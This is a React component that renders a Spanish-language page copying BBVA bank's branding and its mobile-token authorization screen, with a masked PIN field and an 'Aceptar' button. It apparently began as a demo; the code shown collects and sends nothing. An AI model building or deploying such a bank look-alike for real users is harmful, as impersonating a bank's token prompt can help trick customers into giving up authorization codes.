import * as React from 'react';
import PropTypes from 'prop-types';
import { Global } from '@emotion/react';
import { styled } from '@mui/material/styles';
import CssBaseline from '@mui/material/CssBaseline';
import { grey } from '@mui/material/colors';
import Box from '@mui/material/Box';
import BBVASvgImg from '../components/bbva/icons/bbvaIcon';
import { bbvaPrimaryColor } from '../components/bbva/constants';
import { AppBar,Button,Card,CardMedia,Stack, Toolbar, Typography } from '@mui/material';
import BBVABkgImg from '../../static/bbva/bbva-bkg.jpeg';
import BBVACandadoImg from '../../static/bbva/candado_bbva.png';
import PinField from "react-pin-field";
import * as styles from './mystyles.css';
import cn from "classnames";


const drawerBleeding = 56;

const Root = styled('div')(({ theme }) => ({
  height: '100%',
  backgroundColor:
    theme.palette.mode === 'light' ? grey[100] : theme.palette.background.default,
}));


function SwipeableEdgeDrawer(props) {
  const [demoCompleted, setDemoCompleted] = React.useState(false);

  return (
    <Root>
      <CssBaseline />
      <Global
        styles={{
          '.MuiDrawer-root > .MuiPaper-root': {
            height: `calc(50% - ${drawerBleeding}px)`,
            overflow: 'visible',
          },
        }}
      />
      <Box display={'flex'} flexDirection={'column'}>
        <AppBar
            position="fixed"
            sx={{
            backgroundColor: bbvaPrimaryColor,
            }}
        >
            <Toolbar>
            <Stack direction="row" justifyContent="center" width="100%">
                <BBVASvgImg></BBVASvgImg>
            </Stack>
            </Toolbar>
        </AppBar>
        <Box marginTop={'55px'}
            sx={{ flexGrow: 1, 
                  p: 3, 
                  height: '700px',
                  justifyContent: 'center',
                  display: 'flex',
                  backgroundImage: `url(${BBVABkgImg})` }}>
          <Stack sx={{display:'flex',alignItems: 'center'}}>
            <Box><Typography component={"h1"} color={'white'} fontSize={'25px'} fontWeight={'bold'} paragraph>Autorizar</Typography></Box>
            <Card sx={{ maxWidth: '150px', marginBottom: '16px' }}>
              <CardMedia
                  component="img"
                  height={"150px"}
                  width={"150px"}
                  image={BBVACandadoImg}
                  sx={{backgroundColor:"cornflowerblue"}}
                  alt="Paella dish"
                />
            </Card>
            <Box>
              <Typography component={"h1"} color={'white'} paragraph textAlign={'center'}>El token de seguridad se ha generado de forma <b>automática con tu Token Móvil</b></Typography>
            </Box>
            <Box>
              <div className="pin-field-container">
                <PinField
                  className={cn("pin-field", {complete: demoCompleted})}
                  onComplete={() => setDemoCompleted(true)}
                  format={k => '*'}
                  disabled={demoCompleted}
                  autoComplete="one-time-password"
                />
            </div>
            </Box>
            <Box sx={{ marginTop: '50px',
                justifyContent: 'center',
                justifyItems: 'center',
                alignContent: 'center',
                alignItems: 'center',
                flexDirection:'column',
                  display: 'flex', }}>
                <Typography component={"h1"} color={'white'} paragraph textAlign={'center'}>Presiona "Aceptar" para confirmar la Operación</Typography>
                <Box sx={{maxWidth: '50%'}}>
                  <Button variant="contained" href="/token_ok" >Aceptar</Button>
                </Box>
            </Box>
          </Stack>         
        </Box>

      </Box>


    </Root>
  );
}

SwipeableEdgeDrawer.propTypes = {
  /**
   * Injected by the documentation to work in an iframe.
   * You won't need it on your project.
   */
  windowRef: PropTypes.func,
};

export default SwipeableEdgeDrawer;

